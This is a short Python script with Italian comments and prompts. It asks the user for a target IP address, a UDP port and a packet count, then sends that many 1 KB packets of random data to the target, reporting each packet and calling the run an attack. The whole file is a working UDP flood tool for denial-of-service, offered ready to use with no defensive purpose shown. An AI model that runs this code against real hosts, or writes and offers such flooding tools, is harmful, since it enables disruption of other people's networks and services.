import socket
import random

def udp_flood(target_ip, target_port, num_packets):
    # Crea un socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Crea un pacchetto di 1 KB (1024 byte) con dati casuali
    packet = random._urandom(1024)

    print(f"Inizio UDP flood su {target_ip}:{target_port}")
    print(f"Inviando {num_packets} pacchetti da 1 KB ciascuno...")

    try:
        for i in range(num_packets):
            sock.sendto(packet, (target_ip, target_port))
            print(f"Pacchetto {i + 1} inviato a {target_ip}:{target_port}")
    except KeyboardInterrupt:
        print("Attacco interrotto manualmente.")
    finally:
        sock.close()
        print("Attacco terminato.")

if __name__ == "__main__":
    # Richiedi all'utente l'IP della macchina target
    target_ip = input("Inserisci l'indirizzo IP della macchina target: ")
    
    # Richiedi all'utente la porta UDP della macchina target
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    
    # Richiedi all'utente il numero di pacchetti da inviare
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
    
    # Avvia la simulazione dell'UDP flood
    udp_flood(target_ip, target_port, num_packets)
